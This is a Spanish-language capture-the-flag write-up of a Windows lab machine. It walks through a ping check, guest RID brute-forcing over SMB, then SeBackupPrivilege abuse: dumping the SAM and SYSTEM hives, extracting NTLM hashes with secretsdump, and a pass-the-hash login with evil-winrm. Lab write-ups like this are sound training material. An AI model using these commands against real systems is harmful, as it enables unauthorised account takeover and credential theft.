# Reconocimiento Inicial
**En esta seccion hago un ping para ver el ttl y si tenemos conexion a la maquina.**

Empiezo haciendo un `ping` para enviar un paquete ICMP a la victima, de esta forma podemos hacernos una idea de su sistema operativo y también si tenemos conexión a ella

```bash
ping -c1 10.129.231.149

PING 10.129.231.149 (10.129.231.149) 56(84) bytes of data.
64 bytes from 10.129.231.149: icmp_seq=1 ttl=127 time=76.9 ms

--- 10.129.231.149 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 76.946/76.946/76.946/0.000 ms
```

Vemos que hemos recibido el paquete de vuelta, esto quiere decir que tenemos conexión a la maquina, y también vemos un `TTL (Time To Live)` de **127** así que podemos asumir que estamos ante una maquina **Windows**.

Parece ser que podemos acceder como usuario tanto al recurso por defecto `IPC$` como a `HR`, antes de entrar al recurso `HR` vamos a enumerar usuarios gracias al recurso compartido `IPC$`

> [!tip] La enumeración de usuarios a través de **IPC$** es posible porque este recurso actúa como un canal de transporte para **MSRPC (Microsoft Remote Procedure Call)**, permitiendo que un cliente interactúe con las APIs de gestión del sistema sin necesidad de acceder a archivos físicos.

```bash 
nxc smb 10.129.231.149 -u 'Guest' -p '' --rid-brute | grep -oP 'CICADA\\(?P<full_match>[^ ]+\s+\(SidType[^)]+\))'
```

## Emily.oscars -> Administrator
Podemos ver que tenemos habilitado el privilegio `SeBackupPrivilege` asi que vamos a abusar de el para cargar el sam y system en nuestro pc local

para ello nos guiaremos de este repositorio de github

https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md

```powershell
reg save hklm\sam C:\temp\sam.hive

reg save hklm\system C:\temp\system.hive
```

despues utilizaremos el siguiente comando para obtener el Hash NTLM del usuario admin y poder hacer un ataque PassTheHash

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

```bash
evil-winrm -i <ip> -u "Administrator" -H "<hash>"
```
